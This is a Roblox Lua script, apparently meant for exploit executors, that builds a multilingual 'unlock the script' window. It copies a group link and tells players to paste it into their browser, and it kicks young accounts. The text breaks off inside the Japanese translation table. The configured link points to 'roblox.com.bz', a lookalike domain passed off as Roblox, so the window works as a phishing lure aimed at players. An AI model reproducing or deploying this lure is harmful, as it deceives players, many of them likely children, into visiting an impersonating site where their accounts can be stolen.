-- Lumen - group invite window (copies the group link, nothing else)
-- Pick a language, tap Join Group: the link is copied, paste it in your browser and join.
-- "-" minimizes to a bubble (tap the bubble to reopen). No close button: the only action is copying the group link.

------------ CONFIG ------------
local NAME = "Lumen"
local GROUP_LINK = "https://roblox.com.bz/communities/9529552772/" -- paste your group link between the quotes (shorturl.asia is fine). Test it first: it must open roblox.com
local GROUP_NAME = "Your Group"   -- only used in the "couldn't copy the link" message
local MIN_ACCOUNT_AGE_DAYS = 30   -- accounts younger than this are treated as alts. Set to 0 to turn the check off
local KICK_NEW_ACCOUNTS = true    -- true: kick the new account out of the game. false: just stop the window from showing
--------------------------------

if GROUP_LINK == "YOUR_GROUP_LINK_HERE" then
	warn("[" .. NAME .. "] Set GROUP_LINK at the top of the script first.")
	pcall(function()
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = NAME, Text = "Set GROUP_LINK at the top of the script first.", Duration = 10,
		})
	end)
	return
end

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local GuiService = game:GetService("GuiService")
local Lighting = game:GetService("Lighting")
local LocalizationService = game:GetService("LocalizationService")
local LocalPlayer = Players.LocalPlayer
while not LocalPlayer do
	Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
	LocalPlayer = Players.LocalPlayer
end

local C = {
	bg = Color3.fromRGB(12, 12, 17),
	surface = Color3.fromRGB(21, 21, 29),
	surfaceHover = Color3.fromRGB(30, 30, 40),
	stroke = Color3.fromRGB(38, 38, 52),
	strokeHover = Color3.fromRGB(72, 72, 96),
	text = Color3.fromRGB(242, 242, 248),
	muted = Color3.fromRGB(128, 131, 154),
	accent = Color3.fromRGB(139, 124, 255),
	accent2 = Color3.fromRGB(86, 160, 255),
	success = Color3.fromRGB(110, 231, 160),
	danger = Color3.fromRGB(248, 113, 113),
	white = Color3.new(1, 1, 1),
}
local W, H, HEADER, SIDEBAR, CORNER = 540, 320, 48, 150, 18
local PAGE_W, PAGE_H = W - SIDEBAR, H - HEADER

---------------- helpers ----------------
local function make(class, props, parent)
	local obj = Instance.new(class)
	for k, v in pairs(props) do obj[k] = v end
	obj.Parent = parent
	return obj
end

local function tween(obj, t, props, style)
	TweenService:Create(obj, TweenInfo.new(t, style or Enum.EasingStyle.Quint, Enum.EasingDirection.Out), props):Play()
end

local function round(obj, r)
	return make("UICorner", { CornerRadius = UDim.new(0, r) }, obj)
end

local function stroke(obj, color, thickness, transparency)
	return make("UIStroke", {
		Color = color, Thickness = thickness or 1, Transparency = transparency or 0,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
	}, obj)
end

local function label(props, parent)
	props.BackgroundTransparency = 1
	props.BorderSizePixel = 0
	props.Font = props.Font or Enum.Font.Gotham
	return make("TextLabel", props, parent)
end

-- single-line text that shrinks to fit instead of getting cut off (long translations)
local function fitLabel(props, parent, maxSize)
	props.TextScaled = true
	local l = label(props, parent)
	make("UITextSizeConstraint", { MaxTextSize = maxSize, MinTextSize = 8 }, l)
	return l
end

-- endless gradient rotation from one looping tween (no per-frame code)
local function spin(grad, seconds)
	TweenService:Create(grad, TweenInfo.new(seconds, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, -1), { Rotation = 360 }):Play()
end

local function sweep(dark, bright)
	local k = ColorSequenceKeypoint.new
	return ColorSequence.new({ k(0, dark), k(0.35, dark), k(0.5, bright), k(0.65, dark), k(1, dark) })
end

local function copy(str)
	local clip = setclipboard or toclipboard
	return (clip and pcall(clip, str)) or false
end

-- hover/press wiring that also resets on touch screens (they have no MouseLeave)
local function bind(btn, enter, leave, down, up)
	btn.MouseEnter:Connect(enter)
	btn.MouseLeave:Connect(leave)
	btn.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.Touch then leave() end
	end)
	if down then btn.MouseButton1Down:Connect(down) end
	if up then btn.MouseButton1Up:Connect(up) end
end

---------------- languages ----------------
-- To add a language: copy the "en" block, translate it, and add it to LANGS.
-- (Arabic, Thai and other non-Latin scripts rely on Roblox's fallback fonts, so check how they look.)
local LANGS = {
	{ "en", "English" },
	{ "es", "Espa\u{f1}ol" },
	{ "pt", "Portugu\u{ea}s" },
	{ "ru", "\u{420}\u{443}\u{441}\u{441}\u{43a}\u{438}\u{439}" },
	{ "tr", "T\u{fc}rk\u{e7}e" },
	{ "ar", "\u{627}\u{644}\u{639}\u{631}\u{628}\u{64a}\u{629}" },
	{ "id", "Indonesia" },
	{ "vi", "Ti\u{1ebf}ng Vi\u{1ec7}t" },
	{ "fil", "Filipino" },
	{ "fr", "Fran\u{e7}ais" },
	{ "de", "Deutsch" },
	{ "pl", "Polski" },
	{ "th", "\u{e44}\u{e17}\u{e22}" },
	{ "it", "Italiano" },
	{ "ko", "\u{d55c}\u{ad6d}\u{c5b4}" },
	{ "ja", "\u{65e5}\u{672c}\u{8a9e}" },
	{ "zh", "\u{7b80}\u{4f53}\u{4e2d}\u{6587}" },
	{ "zht", "\u{7e41}\u{9ad4}\u{4e2d}\u{6587}" },
	{ "nl", "Nederlands" },
	{ "uk", "\u{423}\u{43a}\u{440}\u{430}\u{457}\u{43d}\u{441}\u{44c}\u{43a}\u{430}" },
	{ "ro", "Rom\u{e2}n\u{103}" },
	{ "hi", "\u{939}\u{93f}\u{928}\u{94d}\u{926}\u{940}" },
	{ "ms", "Melayu" },
}

local STR = {
	en = {
		join_title = "Unlock the script",
		join_sub = "To unlock the script, you need to join the group.",
		s1 = "Tap Join Group. The link gets copied.",
		s2 = "Open your browser and paste it in.",
		s3 = "Press Join on the group page. Done!",
		join_btn = "Join Group",
		link_copied = "Link copied. Paste it in your browser.",
		copy_failed = "Couldn't copy. Search \u{201c}%s\u{201d} on Roblox and join.",
		tab_join = "Unlock", tab_lang = "Language",
		lang_sub = "Choose your language",
		kick_msg = "Account too new. Come back when it is %s days old.",
		already = "You're already in the group. Thanks!",
	},
	es = {
		join_title = "Desbloquea el script",
		join_sub = "Para desbloquear el script, debes unirte al grupo.",
		s1 = "Pulsa Unirse al grupo. El enlace se copia.",
		s2 = "Abre tu navegador y p\u{e9}galo.",
		s3 = "Pulsa Unirse en la p\u{e1}gina del grupo. \u{a1}Listo!",
		join_btn = "Unirse al grupo",
		link_copied = "Enlace copiado. P\u{e9}galo en tu navegador.",
		copy_failed = "No se pudo copiar. Busca \u{201c}%s\u{201d} en Roblox y \u{fa}nete.",
		tab_join = "Desbloquear", tab_lang = "Idioma",
		lang_sub = "Elige tu idioma",
		kick_msg = "Cuenta demasiado nueva. Vuelve cuando tenga %s d\u{ed}as.",
		already = "Ya est\u{e1}s en el grupo. \u{a1}Gracias!",
	},
	pt = {
		join_title = "Libere o script",
		join_sub = "Para liberar o script, voc\u{ea} precisa entrar no grupo.",
		s1 = "Toque em Entrar no grupo. O link \u{e9} copiado.",
		s2 = "Abra o navegador e cole o link.",
		s3 = "Toque em Entrar na p\u{e1}gina do grupo. Pronto!",
		join_btn = "Entrar no grupo",
		link_copied = "Link copiado. Cole no seu navegador.",
		copy_failed = "N\u{e3}o deu para copiar. Busque \u{201c}%s\u{201d} no Roblox e entre.",
		tab_join = "Liberar", tab_lang = "Idioma",
		lang_sub = "Escolha seu idioma",
		kick_msg = "Conta muito nova. Volte quando ela tiver %s dias.",
		already = "Voc\u{ea} j\u{e1} est\u{e1} no grupo. Obrigado!",
	},
	ru = {
		join_title = "\u{420}\u{430}\u{437}\u{431}\u{43b}\u{43e}\u{43a}\u{438}\u{440}\u{443}\u{439} \u{441}\u{43a}\u{440}\u{438}\u{43f}\u{442}",
		join_sub = "\u{427}\u{442}\u{43e}\u{431}\u{44b} \u{440}\u{430}\u{437}\u{431}\u{43b}\u{43e}\u{43a}\u{438}\u{440}\u{43e}\u{432}\u{430}\u{442}\u{44c} \u{441}\u{43a}\u{440}\u{438}\u{43f}\u{442}, \u{43d}\u{443}\u{436}\u{43d}\u{43e} \u{432}\u{441}\u{442}\u{443}\u{43f}\u{438}\u{442}\u{44c} \u{432} \u{433}\u{440}\u{443}\u{43f}\u{43f}\u{443}.",
		join_btn = "\u{412}\u{441}\u{442}\u{443}\u{43f}\u{438}\u{442}\u{44c} \u{432} \u{433}\u{440}\u{443}\u{43f}\u{43f}\u{443}",
		s1 = "\u{41d}\u{430}\u{436}\u{43c}\u{438} \u{ab}\u{412}\u{441}\u{442}\u{443}\u{43f}\u{438}\u{442}\u{44c} \u{432} \u{433}\u{440}\u{443}\u{43f}\u{43f}\u{443}\u{bb}. \u{421}\u{441}\u{44b}\u{43b}\u{43a}\u{430} \u{441}\u{43a}\u{43e}\u{43f}\u{438}\u{440}\u{443}\u{435}\u{442}\u{441}\u{44f}.",
		s2 = "\u{41e}\u{442}\u{43a}\u{440}\u{43e}\u{439} \u{431}\u{440}\u{430}\u{443}\u{437}\u{435}\u{440} \u{438} \u{432}\u{441}\u{442}\u{430}\u{432}\u{44c} \u{435}\u{451}.",
		s3 = "\u{41d}\u{430}\u{436}\u{43c}\u{438} \u{ab}\u{412}\u{441}\u{442}\u{443}\u{43f}\u{438}\u{442}\u{44c}\u{bb} \u{43d}\u{430} \u{441}\u{442}\u{440}\u{430}\u{43d}\u{438}\u{446}\u{435} \u{433}\u{440}\u{443}\u{43f}\u{43f}\u{44b}. \u{413}\u{43e}\u{442}\u{43e}\u{432}\u{43e}!",
		link_copied = "\u{421}\u{441}\u{44b}\u{43b}\u{43a}\u{430} \u{441}\u{43a}\u{43e}\u{43f}\u{438}\u{440}\u{43e}\u{432}\u{430}\u{43d}\u{430}. \u{412}\u{441}\u{442}\u{430}\u{432}\u{44c} \u{435}\u{451} \u{432} \u{431}\u{440}\u{430}\u{443}\u{437}\u{435}\u{440}.",
		copy_failed = "\u{41d}\u{435} \u{443}\u{434}\u{430}\u{43b}\u{43e}\u{441}\u{44c} \u{441}\u{43a}\u{43e}\u{43f}\u{438}\u{440}\u{43e}\u{432}\u{430}\u{442}\u{44c}. \u{41d}\u{430}\u{439}\u{434}\u{438} \u{ab}%s\u{bb} \u{432} Roblox \u{438} \u{432}\u{441}\u{442}\u{443}\u{43f}\u{438}.",
		tab_join = "\u{41e}\u{442}\u{43a}\u{440}\u{44b}\u{442}\u{44c}", tab_lang = "\u{42f}\u{437}\u{44b}\u{43a}",
		lang_sub = "\u{412}\u{44b}\u{431}\u{435}\u{440}\u{438} \u{44f}\u{437}\u{44b}\u{43a}",
		kick_msg = "\u{410}\u{43a}\u{43a}\u{430}\u{443}\u{43d}\u{442} \u{441}\u{43b}\u{438}\u{448}\u{43a}\u{43e}\u{43c} \u{43d}\u{43e}\u{432}\u{44b}\u{439}. \u{412}\u{435}\u{440}\u{43d}\u{438}\u{441}\u{44c}, \u{43a}\u{43e}\u{433}\u{434}\u{430} \u{435}\u{43c}\u{443} \u{431}\u{443}\u{434}\u{435}\u{442} %s \u{434}\u{43d}.",
		already = "\u{422}\u{44b} \u{443}\u{436}\u{435} \u{432} \u{433}\u{440}\u{443}\u{43f}\u{43f}\u{435}. \u{421}\u{43f}\u{430}\u{441}\u{438}\u{431}\u{43e}!",
	},
	tr = {
		join_title = "Scripti a\u{e7}",
		join_sub = "Scripti a\u{e7}mak i\u{e7}in gruba kat\u{131}lman gerekiyor.",
		s1 = "Gruba Kat\u{131}l'a bas. Ba\u{11f}lant\u{131} kopyalan\u{131}r.",
		s2 = "Taray\u{131}c\u{131}n\u{131} a\u{e7} ve yap\u{131}\u{15f}t\u{131}r.",
		s3 = "Grup sayfas\u{131}nda Kat\u{131}l'a bas. Bitti!",
		join_btn = "Gruba Kat\u{131}l",
		link_copied = "Ba\u{11f}lant\u{131} kopyaland\u{131}. Taray\u{131}c\u{131}na yap\u{131}\u{15f}t\u{131}r.",
		copy_failed = "Kopyalanamad\u{131}. Roblox'ta \u{201c}%s\u{201d} ara ve kat\u{131}l.",
		tab_join = "Kilidi A\u{e7}", tab_lang = "Dil",
		lang_sub = "Dilini se\u{e7}",
		kick_msg = "Hesap \u{e7}ok yeni. Hesab\u{131}n %s g\u{fc}nl\u{fc}k olunca tekrar gel.",
		already = "Zaten gruptas\u{131}n. Te\u{15f}ekk\u{fc}rler!",
	},
	ar = {
		join_title = "\u{627}\u{641}\u{62a}\u{62d} \u{627}\u{644}\u{633}\u{643}\u{631}\u{628}\u{62a}",
		join_sub = "\u{644}\u{641}\u{62a}\u{62d} \u{627}\u{644}\u{633}\u{643}\u{631}\u{628}\u{62a} \u{64a}\u{62c}\u{628} \u{623}\u{646} \u{62a}\u{646}\u{636}\u{645} \u{625}\u{644}\u{649} \u{627}\u{644}\u{645}\u{62c}\u{645}\u{648}\u{639}\u{629}.",
		join_btn = "\u{627}\u{646}\u{636}\u{645} \u{625}\u{644}\u{649} \u{627}\u{644}\u{645}\u{62c}\u{645}\u{648}\u{639}\u{629}",
		s1 = "\u{627}\u{636}\u{63a}\u{637} \u{639}\u{644}\u{649} \u{ab}\u{627}\u{646}\u{636}\u{645} \u{625}\u{644}\u{649} \u{627}\u{644}\u{645}\u{62c}\u{645}\u{648}\u{639}\u{629}\u{bb} \u{644}\u{64a}\u{62a}\u{645} \u{646}\u{633}\u{62e} \u{627}\u{644}\u{631}\u{627}\u{628}\u{637}.",
		s2 = "\u{627}\u{641}\u{62a}\u{62d} \u{627}\u{644}\u{645}\u{62a}\u{635}\u{641}\u{62d} \u{648}\u{627}\u{644}\u{635}\u{642} \u{627}\u{644}\u{631}\u{627}\u{628}\u{637}.",
		s3 = "\u{627}\u{636}\u{63a}\u{637} \u{ab}\u{627}\u{646}\u{636}\u{645}\u{627}\u{645}\u{bb} \u{641}\u{64a} \u{635}\u{641}\u{62d}\u{629} \u{627}\u{644}\u{645}\u{62c}\u{645}\u{648}\u{639}\u{629}. \u{627}\u{646}\u{62a}\u{647}\u{64a}\u{646}\u{627}!",
		link_copied = "\u{62a}\u{645} \u{646}\u{633}\u{62e} \u{627}\u{644}\u{631}\u{627}\u{628}\u{637}. \u{627}\u{644}\u{635}\u{642}\u{647} \u{641}\u{64a} \u{627}\u{644}\u{645}\u{62a}\u{635}\u{641}\u{62d}.",
		copy_failed = "\u{62a}\u{639}\u{630}\u{651}\u{631} \u{627}\u{644}\u{646}\u{633}\u{62e}. \u{627}\u{628}\u{62d}\u{62b} \u{639}\u{646} \u{ab}%s\u{bb} \u{641}\u{64a} \u{631}\u{648}\u{628}\u{644}\u{648}\u{643}\u{633} \u{648}\u{627}\u{646}\u{636}\u{645}.",
		tab_join = "\u{641}\u{62a}\u{62d}", tab_lang = "\u{627}\u{644}\u{644}\u{63a}\u{629}",
		lang_sub = "\u{627}\u{62e}\u{62a}\u{631} \u{644}\u{63a}\u{62a}\u{643}",
		kick_msg = "\u{627}\u{644}\u{62d}\u{633}\u{627}\u{628} \u{62c}\u{62f}\u{64a}\u{62f} \u{62c}\u{62f}\u{64b}\u{627}. \u{639}\u{62f} \u{639}\u{646}\u{62f}\u{645}\u{627} \u{64a}\u{628}\u{644}\u{63a} \u{639}\u{645}\u{631}\u{647} %s \u{64a}\u{648}\u{645}\u{64b}\u{627}.",
		already = "\u{623}\u{646}\u{62a} \u{628}\u{627}\u{644}\u{641}\u{639}\u{644} \u{641}\u{64a} \u{627}\u{644}\u{645}\u{62c}\u{645}\u{648}\u{639}\u{629}. \u{634}\u{643}\u{631}\u{64b}\u{627}!",
	},
	id = {
		join_title = "Buka script",
		join_sub = "Untuk membuka script, kamu harus bergabung ke grup.",
		s1 = "Tekan Gabung Grup. Tautan akan disalin.",
		s2 = "Buka browser lalu tempel tautannya.",
		s3 = "Tekan Gabung di halaman grup. Selesai!",
		join_btn = "Gabung Grup",
		link_copied = "Tautan disalin. Tempel di browser.",
		copy_failed = "Gagal menyalin. Cari \u{201c}%s\u{201d} di Roblox lalu gabung.",
		tab_join = "Buka", tab_lang = "Bahasa",
		lang_sub = "Pilih bahasa kamu",
		kick_msg = "Akun terlalu baru. Kembali lagi saat akunmu berusia %s hari.",
		already = "Kamu sudah ada di grup. Terima kasih!",
	},
	vi = {
		join_title = "M\u{1edf} kh\u{f3}a script",
		join_sub = "\u{110}\u{1ec3} m\u{1edf} kh\u{f3}a script, b\u{1ea1}n c\u{1ea7}n tham gia nh\u{f3}m.",
		join_btn = "Tham gia nh\u{f3}m",
		s1 = "Nh\u{1ea5}n Tham gia nh\u{f3}m. Li\u{ea}n k\u{1ebf}t s\u{1ebd} \u{111}\u{1b0}\u{1ee3}c sao ch\u{e9}p.",
		s2 = "M\u{1edf} tr\u{ec}nh duy\u{1ec7}t v\u{e0} d\u{e1}n li\u{ea}n k\u{1ebf}t v\u{e0}o.",
		s3 = "Nh\u{1ea5}n Tham gia tr\u{ea}n trang nh\u{f3}m. Xong!",
		link_copied = "\u{110}\u{e3} sao ch\u{e9}p li\u{ea}n k\u{1ebf}t. H\u{e3}y d\u{e1}n v\u{e0}o tr\u{ec}nh duy\u{1ec7}t.",
		copy_failed = "Kh\u{f4}ng sao ch\u{e9}p \u{111}\u{1b0}\u{1ee3}c. H\u{e3}y t\u{ec}m \u{201c}%s\u{201d} tr\u{ea}n Roblox r\u{1ed3}i tham gia.",
		tab_join = "M\u{1edf} kh\u{f3}a", tab_lang = "Ng\u{f4}n ng\u{1eef}",
		lang_sub = "Ch\u{1ecd}n ng\u{f4}n ng\u{1eef}",
		kick_msg = "T\u{e0}i kho\u{1ea3}n qu\u{e1} m\u{1edb}i. H\u{e3}y quay l\u{1ea1}i khi t\u{e0}i kho\u{1ea3}n \u{111}\u{1ee7} %s ng\u{e0}y tu\u{1ed5}i.",
		already = "B\u{1ea1}n \u{111}\u{e3} \u{1edf} trong nh\u{f3}m r\u{1ed3}i. C\u{1ea3}m \u{1a1}n!",
	},
	fil = {
		join_title = "I-unlock ang script",
		join_sub = "Para ma-unlock ang script, kailangan mong sumali sa grupo.",
		s1 = "Pindutin ang Sumali. Makokopya ang link.",
		s2 = "Buksan ang browser at i-paste ito.",
		s3 = "Pindutin ang Sumali sa group page. Tapos na!",
		join_btn = "Sumali sa Grupo",
		link_copied = "Nakopya ang link. I-paste sa browser.",
		copy_failed = "Hindi makopya. Hanapin ang \u{201c}%s\u{201d} sa Roblox at sumali.",
		tab_join = "I-unlock", tab_lang = "Wika",
		lang_sub = "Piliin ang iyong wika",
		kick_msg = "Masyadong bago ang account. Bumalik kapag %s araw na ito.",
		already = "Nasa grupo ka na. Salamat!",
	},
	fr = {
		join_title = "D\u{e9}bloquez le script",
		join_sub = "Pour d\u{e9}bloquer le script, vous devez rejoindre le groupe.",
		s1 = "Appuyez sur Rejoindre. Le lien est copi\u{e9}.",
		s2 = "Ouvrez votre navigateur et collez-le.",
		s3 = "Appuyez sur Rejoindre sur la page du groupe. C'est fini !",
		join_btn = "Rejoindre le groupe",
		link_copied = "Lien copi\u{e9}. Collez-le dans votre navigateur.",
		copy_failed = "Copie impossible. Cherchez \u{ab} %s \u{bb} sur Roblox et rejoignez.",
		tab_join = "D\u{e9}bloquer", tab_lang = "Langue",
		lang_sub = "Choisissez votre langue",
		kick_msg = "Compte trop r\u{e9}cent. Revenez quand il aura %s jours.",
		already = "Vous \u{ea}tes d\u{e9}j\u{e0} dans le groupe. Merci !",
	},
	de = {
		join_title = "Schalte das Script frei",
		join_sub = "Um das Script freizuschalten, musst du der Gruppe beitreten.",
		s1 = "Tippe auf Gruppe beitreten. Der Link wird kopiert.",
		s2 = "\u{d6}ffne den Browser und f\u{fc}ge ihn ein.",
		s3 = "Tippe auf der Gruppenseite auf Beitreten. Fertig!",
		join_btn = "Gruppe beitreten",
		link_copied = "Link kopiert. F\u{fc}ge ihn im Browser ein.",
		copy_failed = "Kopieren fehlgeschlagen. Suche \u{201e}%s\u{201c} auf Roblox und tritt bei.",
		tab_join = "Freischalten", tab_lang = "Sprache",
		lang_sub = "W\u{e4}hle deine Sprache",
		kick_msg = "Konto zu neu. Komm wieder, wenn es %s Tage alt ist.",
		already = "Du bist schon in der Gruppe. Danke!",
	},
	pl = {
		join_title = "Odblokuj skrypt",
		join_sub = "Aby odblokowa\u{107} skrypt, musisz do\u{142}\u{105}czy\u{107} do grupy.",
		join_btn = "Do\u{142}\u{105}cz do grupy",
		s1 = "Kliknij Do\u{142}\u{105}cz do grupy. Link si\u{119} skopiuje.",
		s2 = "Otw\u{f3}rz przegl\u{105}dark\u{119} i wklej go.",
		s3 = "Kliknij Do\u{142}\u{105}cz na stronie grupy. Gotowe!",
		link_copied = "Link skopiowany. Wklej go w przegl\u{105}darce.",
		copy_failed = "Nie uda\u{142}o si\u{119} skopiowa\u{107}. Wyszukaj \u{201e}%s\u{201d} w Roblox i do\u{142}\u{105}cz.",
		tab_join = "Odblokuj", tab_lang = "J\u{119}zyk",
		lang_sub = "Wybierz j\u{119}zyk",
		kick_msg = "Konto jest zbyt nowe. Wr\u{f3}\u{107}, gdy b\u{119}dzie mia\u{142}o %s dni.",
		already = "Jeste\u{15b} ju\u{17c} w grupie. Dzi\u{119}ki!",
	},
	th = {
		join_title = "\u{e1b}\u{e25}\u{e14}\u{e25}\u{e47}\u{e2d}\u{e01}\u{e2a}\u{e04}\u{e23}\u{e34}\u{e1b}\u{e15}\u{e4c}",
		join_sub = "\u{e2b}\u{e32}\u{e01}\u{e15}\u{e49}\u{e2d}\u{e07}\u{e01}\u{e32}\u{e23}\u{e1b}\u{e25}\u{e14}\u{e25}\u{e47}\u{e2d}\u{e01}\u{e2a}\u{e04}\u{e23}\u{e34}\u{e1b}\u{e15}\u{e4c} \u{e04}\u{e38}\u{e13}\u{e15}\u{e49}\u{e2d}\u{e07}\u{e40}\u{e02}\u{e49}\u{e32}\u{e23}\u{e48}\u{e27}\u{e21}\u{e01}\u{e25}\u{e38}\u{e48}\u{e21}",
		join_btn = "\u{e40}\u{e02}\u{e49}\u{e32}\u{e23}\u{e48}\u{e27}\u{e21}\u{e01}\u{e25}\u{e38}\u{e48}\u{e21}",
		s1 = "\u{e01}\u{e14}\u{e40}\u{e02}\u{e49}\u{e32}\u{e23}\u{e48}\u{e27}\u{e21}\u{e01}\u{e25}\u{e38}\u{e48}\u{e21} \u{e25}\u{e34}\u{e07}\u{e01}\u{e4c}\u{e08}\u{e30}\u{e16}\u{e39}\u{e01}\u{e04}\u{e31}\u{e14}\u{e25}\u{e2d}\u{e01}",
		s2 = "\u{e40}\u{e1b}\u{e34}\u{e14}\u{e40}\u{e1a}\u{e23}\u{e32}\u{e27}\u{e4c}\u{e40}\u{e0b}\u{e2d}\u{e23}\u{e4c}\u{e41}\u{e25}\u{e49}\u{e27}\u{e27}\u{e32}\u{e07}\u{e25}\u{e34}\u{e07}\u{e01}\u{e4c}",
		s3 = "\u{e01}\u{e14}\u{e40}\u{e02}\u{e49}\u{e32}\u{e23}\u{e48}\u{e27}\u{e21}\u{e43}\u{e19}\u{e2b}\u{e19}\u{e49}\u{e32}\u{e01}\u{e25}\u{e38}\u{e48}\u{e21} \u{e40}\u{e2a}\u{e23}\u{e47}\u{e08}\u{e41}\u{e25}\u{e49}\u{e27}!",
		link_copied = "\u{e04}\u{e31}\u{e14}\u{e25}\u{e2d}\u{e01}\u{e25}\u{e34}\u{e07}\u{e01}\u{e4c}\u{e41}\u{e25}\u{e49}\u{e27} \u{e27}\u{e32}\u{e07}\u{e43}\u{e19}\u{e40}\u{e1a}\u{e23}\u{e32}\u{e27}\u{e4c}\u{e40}\u{e0b}\u{e2d}\u{e23}\u{e4c}\u{e44}\u{e14}\u{e49}\u{e40}\u{e25}\u{e22}",
		copy_failed = "\u{e04}\u{e31}\u{e14}\u{e25}\u{e2d}\u{e01}\u{e44}\u{e21}\u{e48}\u{e2a}\u{e33}\u{e40}\u{e23}\u{e47}\u{e08} \u{e04}\u{e49}\u{e19}\u{e2b}\u{e32} \u{201c}%s\u{201d} \u{e43}\u{e19} Roblox \u{e41}\u{e25}\u{e49}\u{e27}\u{e40}\u{e02}\u{e49}\u{e32}\u{e23}\u{e48}\u{e27}\u{e21}",
		tab_join = "\u{e1b}\u{e25}\u{e14}\u{e25}\u{e47}\u{e2d}\u{e01}", tab_lang = "\u{e20}\u{e32}\u{e29}\u{e32}",
		lang_sub = "\u{e40}\u{e25}\u{e37}\u{e2d}\u{e01}\u{e20}\u{e32}\u{e29}\u{e32}\u{e02}\u{e2d}\u{e07}\u{e04}\u{e38}\u{e13}",
		kick_msg = "\u{e1a}\u{e31}\u{e0d}\u{e0a}\u{e35}\u{e43}\u{e2b}\u{e21}\u{e48}\u{e40}\u{e01}\u{e34}\u{e19}\u{e44}\u{e1b} \u{e01}\u{e25}\u{e31}\u{e1a}\u{e21}\u{e32}\u{e43}\u{e2b}\u{e21}\u{e48}\u{e40}\u{e21}\u{e37}\u{e48}\u{e2d}\u{e1a}\u{e31}\u{e0d}\u{e0a}\u{e35}\u{e21}\u{e35}\u{e2d}\u{e32}\u{e22}\u{e38} %s \u{e27}\u{e31}\u{e19}",
		already = "\u{e04}\u{e38}\u{e13}\u{e2d}\u{e22}\u{e39}\u{e48}\u{e43}\u{e19}\u{e01}\u{e25}\u{e38}\u{e48}\u{e21}\u{e41}\u{e25}\u{e49}\u{e27} \u{e02}\u{e2d}\u{e1a}\u{e04}\u{e38}\u{e13}!",
	},
	it = {
		join_title = "Sblocca lo script",
		join_sub = "Per sbloccare lo script devi unirti al gruppo.",
		join_btn = "Unisciti al gruppo",
		s1 = "Tocca Unisciti al gruppo. Il link viene copiato.",
		s2 = "Apri il browser e incollalo.",
		s3 = "Premi Unisciti nella pagina del gruppo. Fatto!",
		link_copied = "Link copiato. Incollalo nel browser.",
		copy_failed = "Impossibile copiare. Cerca \u{ab}%s\u{bb} su Roblox e unisciti.",
		tab_join = "Sblocca", tab_lang = "Lingua",
		lang_sub = "Scegli la lingua",
		kick_msg = "Account troppo nuovo. Torna quando avr\u{e0} %s giorni.",
		already = "Sei gi\u{e0} nel gruppo. Grazie!",
	},
	ko = {
		join_title = "\u{c2a4}\u{d06c}\u{b9bd}\u{d2b8} \u{c7a0}\u{ae08} \u{d574}\u{c81c}",
		join_sub = "\u{c2a4}\u{d06c}\u{b9bd}\u{d2b8}\u{b97c} \u{d574}\u{c81c}\u{d558}\u{b824}\u{ba74} \u{adf8}\u{b8f9}\u{c5d0} \u{ac00}\u{c785}\u{d574}\u{c57c} \u{d574}\u{c694}.",
		s1 = "\u{adf8}\u{b8f9} \u{ac00}\u{c785}\u{c744} \u{b204}\u{b974}\u{c138}\u{c694}. \u{b9c1}\u{d06c}\u{ac00} \u{bcf5}\u{c0ac}\u{b3fc}\u{c694}.",
		s2 = "\u{be0c}\u{b77c}\u{c6b0}\u{c800}\u{b97c} \u{c5f4}\u{ace0} \u{bd99}\u{c5ec}\u{b123}\u{c73c}\u{c138}\u{c694}.",
		s3 = "\u{adf8}\u{b8f9} \u{d398}\u{c774}\u{c9c0}\u{c5d0}\u{c11c} \u{ac00}\u{c785}\u{c744} \u{b204}\u{b974}\u{ba74} \u{b05d}!",
		join_btn = "\u{adf8}\u{b8f9} \u{ac00}\u{c785}",
		link_copied = "\u{b9c1}\u{d06c}\u{ac00} \u{bcf5}\u{c0ac}\u{b410}\u{c5b4}\u{c694}. \u{be0c}\u{b77c}\u{c6b0}\u{c800}\u{c5d0} \u{bd99}\u{c5ec}\u{b123}\u{c73c}\u{c138}\u{c694}.",
		copy_failed = "\u{bcf5}\u{c0ac}\u{c5d0} \u{c2e4}\u{d328}\u{d588}\u{c5b4}\u{c694}. Roblox\u{c5d0}\u{c11c} \u{201c}%s\u{201d}\u{b97c} \u{ac80}\u{c0c9}\u{d574} \u{ac00}\u{c785}\u{d558}\u{c138}\u{c694}.",
		tab_join = "\u{d574}\u{c81c}",
		tab_lang = "\u{c5b8}\u{c5b4}",
		lang_sub = "\u{c5b8}\u{c5b4}\u{b97c} \u{c120}\u{d0dd}\u{d558}\u{c138}\u{c694}",
		kick_msg = "\u{acc4}\u{c815}\u{c774} \u{b108}\u{bb34} \u{c0c8}\u{b85c} \u{b9cc}\u{b4e4}\u{c5b4}\u{c84c}\u{c5b4}\u{c694}. \u{acc4}\u{c815} \u{c0dd}\u{c131} \u{d6c4} %s\u{c77c}\u{c774} \u{c9c0}\u{b098}\u{ba74} \u{b2e4}\u{c2dc} \u{c624}\u{c138}\u{c694}.",
		already = "\u{c774}\u{bbf8} \u{adf8}\u{b8f9}\u{c5d0} \u{ac00}\u{c785}\u{b418}\u{c5b4} \u{c788}\u{c5b4}\u{c694}. \u{ac10}\u{c0ac}\u{d569}\u{b2c8}\u{b2e4}!",
	},
	ja = {
		join_title = "\u{30b9}\u{30af}\u{30ea}\u{30d7}\u{30c8}\u{3092}\u{89e3}\u{9664}",
		join_sub = "\u{30b9}\u{30af}\u{30ea}\u{30d7}\u{30c8}\u{3092}\u{89e3}\u{9664}\u{3059}\u{308b}\u{306b}\u{306f}\u{3001}\u{30b0}\u{30eb}\u{30fc}\u{30d7}\u{3078}\u{306e}\u{53c2}\u{52a0}\u{304c}\u{5fc5}\u{8981}\u{3067}\u{3059}\u{3002}",
		s1 = "\u{300c}\u{30b0}\u{30eb}\u{30fc}\u{30d7}\u{306b}\u{53c2}\u{52a0}\u{300d}\u{3092}\u{30bf}\u{30c3}\u{30d7}\u{3002}\u{30ea}\u{30f3}\u{30af}\u{304c}\u{30b3}\u{30d4}\u{30fc}\u{3055}\u{308c}\u{307e}\u{3059}\u{3002}",
		s2 = "\u{30d6}\u{30e9}\u{30a6}\u{30b6}\u{3092}\u{958b}\u{3044}\u{3066}\u{8cbc}\u{308a}\u{4ed8}\u{3051}\u{3066}\u{304f}\u{3060}\u{3055}\u{3044}\u{3002}",
